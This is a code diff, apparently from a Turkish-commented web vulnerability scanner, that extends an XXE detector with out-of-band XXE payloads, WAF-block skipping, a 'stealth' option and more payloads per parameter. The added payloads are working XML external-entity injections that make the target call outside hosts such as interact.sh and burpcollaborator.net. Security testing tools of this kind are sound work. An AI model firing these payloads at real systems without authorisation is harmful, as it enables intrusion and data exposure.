@@ -3,11 +3,37 @@ from ..payloads.nuclei_patterns import XXE_INDICATORS, XXE_PAYLOADS
 
 
 class XXEDetector(BaseDetector):
-    """Nuclei-inspired XXE tespiti."""
+    """Nuclei-inspired XXE tespiti — OOB, DTD, blind, WAF-bypass."""
 
-    def __init__(self, session=None, timeout=10, ai_engine=None, mode='fast', custom_payloads=None):
-        super().__init__(session, timeout, ai_engine, mode, custom_payloads)
+    def __init__(self, session=None, timeout=10, ai_engine=None, mode='fast', custom_payloads=None, stealth=True):
+        super().__init__(session, timeout, ai_engine, mode, custom_payloads, stealth)
         self.payloads = XXE_PAYLOADS
+
+    def _test_oob_xxe(self, endpoint):
+        """Out-of-band XXE testi (blind XXE)."""
+        oob_payloads = [
+            '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://burpcollaborator.net">]><foo>&xxe;</foo>''',
+            '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://interact.sh">]><foo>&xxe;</foo>''',
+            '''<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://canarytokens.com">]><foo>&xxe;</foo>''',
+        ]
+        results = []
+        for payload in oob_payloads:
+            try:
+                headers = {'Content-Type': 'application/xml', 'Accept': '*/*'}
+                resp = self.session.post(
+                    endpoint['url'], data=payload, headers=headers,
+                    timeout=self.timeout, allow_redirects=True,
+                )
+                # OOB XXE genellikle 200 döndürür ama içerik değişmez
+                if resp.status_code == 200:
+                    results.append(self._make_result(
+                        'xxe', endpoint['url'], 'body', 'OOB-XXE', 'low', 'oob-xxe',
+                        hint='Out-of-band XXE payload gönderildi — interact.sh/collaborator ile doğrulayın',
+                    ))
+                    break
+            except Exception:
+                continue
+        return results
 
     def test(self, endpoint):
         results = []
@@ -44,6 +70,9 @@ class XXEDetector(BaseDetector):
                             timeout=self.timeout, allow_redirects=True,
                         )
 
+                    if self._is_waf_blocking(resp):
+                        continue
+
                     indicator = self.analyzer.match_any(resp.text, XXE_INDICATORS)
                     if indicator:
                         results.append(self._make_result(
@@ -63,12 +92,14 @@ class XXEDetector(BaseDetector):
                 except Exception:
                     continue
 
-        # GET parametrelerinde XXE (nuclei oob/file read hints)
+        # GET parametrelerinde XXE
         if endpoint.get('params'):
             for param in endpoint['params']:
-                for payload in self.payloads[:3]:
+                for payload in self.payloads[:5]:
                     try:
                         resp, _, test_url = self._request_get(endpoint, param, payload)
+                        if self._is_waf_blocking(resp):
+                            continue
                         indicator = self.analyzer.match_any(resp.text, XXE_INDICATORS)
                         if indicator:
                             results.append(self._make_result(
@@ -78,5 +109,9 @@ class XXEDetector(BaseDetector):
                             return results
                     except Exception:
                         continue
+
+        # OOB XXE test
+        oob_results = self._test_oob_xxe(endpoint)
+        results.extend(oob_results)
 
         return results
